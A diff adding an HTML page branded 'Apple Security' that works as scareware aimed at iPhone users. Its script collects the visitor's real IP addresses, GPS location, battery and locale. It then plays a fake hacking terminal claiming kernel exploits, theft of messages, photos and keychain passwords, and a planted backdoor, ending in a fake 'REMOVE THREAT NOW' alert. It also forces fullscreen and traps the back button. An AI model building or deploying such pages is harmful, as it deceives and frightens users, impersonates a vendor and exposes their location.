@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Apple Security</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+        #terminal {
+            padding: 15px;
+            height: 100vh;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        .red { color: #f00; }
+        .yellow { color: #ff0; }
+        .cyan { color: #0ff; }
+        .magenta { color: #f0f; }
+        .green { color: #0f0; }
+        .blink { animation: blink 1s infinite; }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        #overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(255,0,0,0.03);
+            pointer-events: none;
+            z-index: 999;
+        }
+        #fake-popup {
+            display: none;
+            position: fixed;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            background: #1a1a1a;
+            border: 2px solid #ff0000;
+            padding: 25px;
+            text-align: center;
+            z-index: 1000;
+            border-radius: 14px;
+            color: #ff0000;
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            font-size: 17px;
+            font-weight: 700;
+            width: 90%;
+            max-width: 330px;
+            box-shadow: 0 0 40px rgba(255,0,0,0.4);
+        }
+        #fake-popup .subtitle {
+            font-size: 13px;
+            color: #ccc;
+            margin-top: 8px;
+            font-weight: 400;
+        }
+        #fake-popup button {
+            background: #ff0000;
+            color: #fff;
+            border: none;
+            padding: 14px 28px;
+            font-size: 17px;
+            border-radius: 10px;
+            margin-top: 18px;
+            width: 100%;
+            font-weight: 700;
+            cursor: pointer;
+        }
+        #fake-popup button:active {
+            background: #cc0000;
+        }
+    </style>
+</head>
+<body>
+
+<div id="terminal"></div>
+<div id="overlay"></div>
+
+<div id="fake-popup">
+    <div>⚠️ CRITICAL THREAT DETECTED ⚠️</div>
+    <div class="subtitle" id="popup-device">Your device has been compromised</div>
+    <button onclick="document.getElementById('fake-popup').style.display='none'">REMOVE THREAT NOW</button>
+</div>
+
+<script>
+(function() {
+    const terminal = document.getElementById('terminal');
+    const overlay = document.getElementById('overlay');
+    const popup = document.getElementById('fake-popup');
+    const popupDevice = document.getElementById('popup-device');
+
+    // ======== СБОР РЕАЛЬНЫХ ДАННЫХ УСТРОЙСТВА ========
+
+    // Определение модели iPhone по разрешению экрана и userAgent
+    function detectIPhoneModel() {
+        const ua = navigator.userAgent;
+        const width = screen.width;
+        const height = screen.height;
+        const pixelRatio = window.devicePixelRatio;
+
+        // iPhone модельная матрица по разрешениям
+        const models = {
+            'iPhone 15 Pro Max': { w: 430, h: 932, pr: 3 },
+            'iPhone 15 Pro': { w: 393, h: 852, pr: 3 },
+            'iPhone 15 Plus': { w: 430, h: 932, pr: 3 },
+            'iPhone 15': { w: 393, h: 852, pr: 3 },
+            'iPhone 14 Pro Max': { w: 430, h: 932, pr: 3 },
+            'iPhone 14 Pro': { w: 393, h: 852, pr: 3 },
+            'iPhone 14 Plus': { w: 428, h: 926, pr: 3 },
+            'iPhone 14': { w: 390, h: 844, pr: 3 },
+            'iPhone 13 Pro Max': { w: 428, h: 926, pr: 3 },
+            'iPhone 13 Pro': { w: 390, h: 844, pr: 3 },
+            'iPhone 13': { w: 390, h: 844, pr: 3 },
+            'iPhone 13 mini': { w: 375, h: 812, pr: 3 },
+            'iPhone 12 Pro Max': { w: 428, h: 926, pr: 3 },
+            'iPhone 12 Pro': { w: 390, h: 844, pr: 3 },
+            'iPhone 12': { w: 390, h: 844, pr: 3 },
+            'iPhone 12 mini': { w: 375, h: 812, pr: 3 },
+            'iPhone 11 Pro Max': { w: 414, h: 896, pr: 3 },
+            'iPhone 11 Pro': { w: 375, h: 812, pr: 3 },
+            'iPhone 11': { w: 414, h: 896, pr: 2 },
+            'iPhone XS Max': { w: 414, h: 896, pr: 3 },
+            'iPhone XS': { w: 375, h: 812, pr: 3 },
+            'iPhone XR': { w: 414, h: 896, pr: 2 },
+            'iPhone X': { w: 375, h: 812, pr: 3 },
+            'iPhone SE (3rd gen)': { w: 375, h: 667, pr: 2 },
+            'iPhone SE (2nd gen)': { w: 375, h: 667, pr: 2 },
+        };
+
+        const w = Math.round(width / pixelRatio);
+        const h = Math.round(height / pixelRatio);
+
+        let bestMatch = 'iPhone (unknown model)';
+        let bestScore = Infinity;
+
+        for (const [model, dims] of Object.entries(models)) {
+            const score = Math.abs(dims.w - w) + Math.abs(dims.h - h) + Math.abs(dims.pr - pixelRatio) * 100;
+            if (score < bestScore) {
+                bestScore = score;
+                bestMatch = model;
+            }
+        }
+
+        // Проверка на iPad
+        if (/iPad/.test(ua) || (navigator.platform === 'MacIntel' && 'ontouchend' in document)) {
+            if (width > 1024) return 'iPad Pro 12.9"';
+            if (width > 800) return 'iPad Air';
+            return 'iPad';
+        }
+
+        return bestMatch;
+    }
+
+    // Версия iOS из userAgent
+    function detectIOSVersion() {
+        const ua = navigator.userAgent;
+        const match = ua.match(/OS (\d+_\d+(_\d+)?)/);
+        if (match) {
+            return match[1].replace(/_/g, '.');
+        }
+        return '17.4.1';
+    }
+
+    // Название браузера
+    function detectBrowser() {
+        const ua = navigator.userAgent;
+        if (/CriOS/.test(ua)) return 'Chrome';
+        if (/FxiOS/.test(ua)) return 'Firefox';
+        if (/EdgiOS/.test(ua)) return 'Edge';
+        return 'Safari';
+    }
+
+    // IP адрес через WebRTC
+    async function getLocalIP() {
+        return new Promise((resolve) => {
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                    const match = ice.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+                    if (match) {
+                        resolve(match[1]);
+                        pc.close();
+                    }
+                };
+                setTimeout(() => resolve('192.168.1.' + Math.floor(Math.random()*254+1)), 1000);
+            } catch(e) {
+                resolve('192.168.1.' + Math.floor(Math.random()*254+1));
+            }
+        });
+    }
+
+    // Публичный IP через fetch (без реального запроса — симуляция)
+    async function getPublicIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch(e) {
+            const oct1 = Math.floor(Math.random()*223)+1;
+            const oct2 = Math.floor(Math.random()*255);
+            const oct3 = Math.floor(Math.random()*255);
+            const oct4 = Math.floor(Math.random()*254)+1;
+            return `${oct1}.${oct2}.${oct3}.${oct4}`;
+        }
+    }
+
+    // Геолокация
+    async function getLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve({ city: 'Unknown', country: 'Unknown' });
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                async (pos) => {
+                    try {
+                        const res = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${pos.coords.latitude}&longitude=${pos.coords.longitude}&localityLanguage=en`);
+                        const data = await res.json();
+                        resolve({
+                            city: data.city || 'Unknown',
+                            country: data.countryName || 'Unknown',
+                            lat: pos.coords.latitude.toFixed(4),
+                            lon: pos.coords.longitude.toFixed(4)
+                        });
+                    } catch(e) {
+                        resolve({
+                            city: 'Unknown',
+                            country: 'Unknown',
+                            lat: pos.coords.latitude.toFixed(4),
+                            lon: pos.coords.longitude.toFixed(4)
+                        });
+                    }
+                },
+                () => resolve({ city: 'Location denied', country: 'Location denied' }),
+                { timeout: 5000, maximumAge: 0 }
+            );
+        });
+    }
+
+    // Батарея
+    async function getBattery() {
+        try {
+            const battery = await navigator.getBattery();
+            return {
+                level: Math.round(battery.level * 100),
+                charging: battery.charging
+            };
+        } catch(e) {
+            return { level: Math.floor(Math.random()*60)+30, charging: false };
+        }
+    }
+
+    // Случайный UDID на основе реальных параметров
+    function generateUDID(model, iosVersion) {
+        const chars = '0123456789ABCDEF';
+        let udid = '';
+        for (let i = 0; i < 32; i++) {
+            udid += chars[Math.floor(Math.random() * 16)];
+        }
+        return udid.substring(0,8) + '-' + udid.substring(8,12) + '-' + udid.substring(12,16) + '-' + udid.substring(16,20) + '-' + udid.substring(20);
+    }
+
+    // ======== АНИМАЦИЯ ТЕРМИНАЛА ========
+
+    function type(text, cls = '', delay = 30) {
+        return new Promise(resolve => {
+            let i = 0;
+            const span = document.createElement('span');
+            if (cls) span.className = cls;
+            terminal.appendChild(span);
+            terminal.scrollTop = terminal.scrollHeight;
+            const interval = setInterval(() => {
+                span.textContent += text[i];
+                terminal.scrollTop = terminal.scrollHeight;
+                i++;
+                if (i >= text.length) {
+                    clearInterval(interval);
+                    resolve();
+                }
+            }, delay);
+        });
+    }
+
+    function newline(count = 1) {
+        for (let i = 0; i < count; i++) {
+            terminal.appendChild(document.createTextNode('\n'));
+        }
+        terminal.scrollTop = terminal.scrollHeight;
+    }
+
+    function vibrate(duration = 200) {
+        if (navigator.vibrate) {
+            navigator.vibrate(duration);
+        }
+    }
+
+    function triggerPopup(model) {
+        popupDevice.textContent = `${model} — Immediate action required`;
+        popup.style.display = 'block';
+        vibrate([200, 100, 200, 100, 500]);
+        setTimeout(() => {
+            popup.style.display = 'none';
+        }, 8000);
+    }
+
+    async function run() {
+        // Сбор всех данных
+        const model = detectIPhoneModel();
+        const iosVersion = detectIOSVersion();
+        const browser = detectBrowser();
+        const localIP = await getLocalIP();
+        const publicIP = await getPublicIP();
+        const location = await getLocation();
+        const battery = await getBattery();
+        const udid = generateUDID(model, iosVersion);
+        const screenW = screen.width;
+        const screenH = screen.height;
+        const pixelRatio = window.devicePixelRatio;
+        const language = navigator.language;
+        const platform = navigator.platform;
+        const cores = navigator.hardwareConcurrency || 'unknown';
+        const ram = (navigator.deviceMemory || Math.floor(Math.random()*4+2)) + ' GB';
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const online = navigator.onLine;
+
+        // Fullscreen
+        try {
+            document.documentElement.requestFullscreen();
+        } catch(e) {}
+
+        // Блокировка кнопки назад
+        window.location.hash = "security_alert";
+        window.addEventListener('popstate', function() {
+            window.location.hash = "security_alert";
+            vibrate(100);
+        });
+
+        // ЗАПУСК ТЕРМИНАЛА
+        await type(`[${model}] — iOS ${iosVersion} — Darwin Kernel 23.0.0`, 'green', 20);
+        newline();
+        await type(`[${browser}] — ${screenW}x${screenH}@${pixelRatio}x — ${ram} RAM`, 'green', 20);
+        newline();
+        await type('──────────────────────────────────────────────', '', 10);
+        newline(2);
+
+        vibrate(100);
+
+        await type('[*] Initializing secure shell connection...', 'yellow', 25);
+        await type(' ESTABLISHED', 'cyan', 15);
+        newline();
+        await type(`[*] Target: ${publicIP} (Public) / ${localIP} (Local)`, 'yellow', 25);
+        newline();
+        await type(`[*] GeoIP: ${location.city}, ${location.country}`, 'yellow', 25);
+        newline();
+        await type(`[*] Coordinates: ${location.lat}, ${location.lon}`, 'yellow', 20);
+        newline(2);
+
+        vibrate(150);
+
+        await type('[Phase 1] iOS Sandbox Escape', 'magenta', 30);
+        newline();
+        await type('  [~] Exploiting CVE-2024-23225 kernel vulnerability...', 'yellow', 25);
+        await type(' OK', 'cyan', 15);
+        newline();
+        await type('  [~] Bypassing AMFI (Apple Mobile File Integrity)...', 'yellow', 25);
+        await type(' OK', 'cyan', 15);
+        newline();
+        await type('  [~] Disabling SIP (System Integrity Protection)...', 'yellow', 25);
+        await type(' OK', 'cyan', 15);
+        newline();
+        await type('  [+] Sandbox escaped. Code execution: kernel mode.', 'green', 20);
+        newline(2);
+
+        vibrate(200);
+
+        await type('[Phase 2] Privilege Escalation', 'magenta', 30);
+        newline();
+        await type('  [~] Exploiting CVE-2024-23208 (kernel r/w)...', 'yellow', 25);
+        await type(' OK', 'cyan', 15);
+        newline();
+        await type('  [~] Overwriting kernel task struct...', 'yellow', 25);
+        await type(' OK', 'cyan', 15);
+        newline();
+        await type('  [+] Root access obtained (uid=0, gid=0).', 'green', 20);
+        newline();
+        await type('  [+] Mounted / as read-write.', 'green', 20);
+        newline(2);
+
+        vibrate(300);
+
+        await type('[Phase 3] Data Extraction', 'magenta', 30);
+        newline();
+        await type('  [i] Device UDID: ' + udid, 'cyan', 20);
+        newline();
+        await type('  [i] Battery: ' + battery.level + '%' + (battery.charging ? ' (Charging)' : ' (Discharging)'), 'cyan', 20);
+        newline();
+        await type('  [i] Language: ' + language, 'cyan', 20);
+        newline();
+        await type('  [i] Timezone: ' + timezone, 'cyan', 20);
+        newline();
+        await type('  [i] CPU Cores: ' + cores, 'cyan', 20);
+        newline();
+        await type('  [i] Online: ' + (online ? 'YES' : 'NO'), 'cyan', 20);
+        newline(2);
+
+        await type('  [~] Dumping /var/mobile/Library/SMS/sms.db...', 'yellow', 25);
+        await type(' ' + Math.floor(Math.random()*15000+500) + ' messages', '', 15);
+        newline();
+        await type('  [~] Dumping /var/mobile/Library/CallHistory/call_history.db...', 'yellow', 25);
+        await type(' ' + Math.floor(Math.random()*3000+100) + ' calls', '', 15);
+        newline();
+        await type('  [~] Dumping /var/mobile/Library/Notes/...', 'yellow', 25);
+        await type(' ' + Math.floor(Math.random()*200+5) + ' notes', '', 15);
+        newline();
+        await type('  [~] Dumping /var/mobile/Media/DCIM/...', 'yellow', 25);
+        await type(' ' + Math.floor(Math.random()*8000+200) + ' photos/videos', '', 15);
+        newline();
+        await type('  [~] Dumping /var/mobile/Containers/Data/...', 'yellow', 25);
+        await type(' WhatsApp, Telegram, Signal', '', 15);
+        newline(2);
+
+        vibrate([150, 80, 150]);
+
+        await type('[Phase 4] Keychain Decryption', 'magenta', 30);
+        newline();
+        await type('  [~] Extracting keychain master key...', 'yellow', 25);
+        await type(' OK', 'cyan', 15);
+        newline();
+        await type('  [~] Decrypting iCloud Keychain...', 'yellow', 25);
+        await type(' OK', 'cyan', 15);
+        newline();
+        await type('  [!] iCloud credentials: ******@icloud.com', 'red', 20);
+        newline();
+        await type('  [!] Saved passwords: ' + Math.floor(Math.random()*80+20) + ' entries', 'red', 20);
+        newline(2);
+
+        vibrate(400);
+
+        await type('[Phase 5] Persistence', 'magenta', 30);
+        newline();
+        await type('  [~] Installing launch daemon...', 'yellow', 25);
+        await type(' /Library/LaunchDaemons/com.apple.softwareupdate.plist', '', 15);
+        newline();
+        await type('  [~] Installing root certificate...', 'yellow', 25);
+        await type(' OK', 'cyan', 15);
+        newline();
+        await type('  [+] Persistence installed. Survives reboot.', 'green', 20);
+        newline(2);
+
+        vibrate([200, 100, 200, 100, 500]);
+
+        await type('[!] DEVICE FULLY COMPROMISED', 'red blink', 35);
+        newline();
+        await type('[!] All data exfiltrated to C2 server', 'red', 25);
+        newline();
+        await type('[!] Backdoor active on port 4444', 'red', 25);
+        newline();
+        await type('[!] Remote access: ENABLED', 'red', 25);
+        newline(2);
+
+        await type('SESSION COMPLETE — ' + new Date().toISOString(), 'cyan', 30);
+        newline(2);
+
+        triggerPopup(model);
+
+        // Мерцание красным
+        setInterval(() => {
+            overlay.style.background = 'rgba(255,0,0,0.06)';
+            vibrate(80);
+            setTimeout(() => {
+                overlay.style.background = 'rgba(255,0,0,0.02)';
+            }, 120);
+        }, 2500);
+    }
+
+    run();
+})();
+</script>
+</body>
+</html>
